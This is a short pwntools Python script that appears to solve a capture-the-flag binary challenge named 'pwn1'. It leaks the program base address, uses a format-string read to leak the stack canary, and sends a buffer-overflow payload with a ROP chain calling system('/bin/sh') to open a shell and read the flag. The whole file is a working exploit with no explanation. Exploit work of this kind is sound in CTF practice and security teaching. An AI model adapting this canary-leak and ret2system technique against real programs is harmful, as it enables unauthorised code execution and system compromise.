from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = remote('',)
#s = process('./pwn1')
elf = ELF('./pwn1')

s.sendlineafter(b'Welcome to mimic world,try something\n', b'1')

s.recvuntil(b'You will find some tricks\n')

elf_base = int(s.recv(14),16) - 0xa94
success('elf_base=>' + hex(elf_base))

binsh = elf_base + 0x202068
system = elf_base + elf.sym['system']
pop_rdi_ret = elf_base + 0x0000000000000c73

sleep(0.1)
s.sendline(b'2')

s.sendafter(b'hello\n', b'%33$p')
canary = int(s.recv(18),16)
success('canary=>' + hex(canary))

sleep(1)
s.sendline(b'2')

#gdb.attach(s)
#pause()

payload = b'a'*0xb8 + b'b'*0x11 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rdi_ret+1) + p64(system)
s.sendline(payload)

s.sendline(b'cat ./flag')
s.sendline(b'cat ./flag')
s.sendline(b'cat ./flag')

s.interactive()
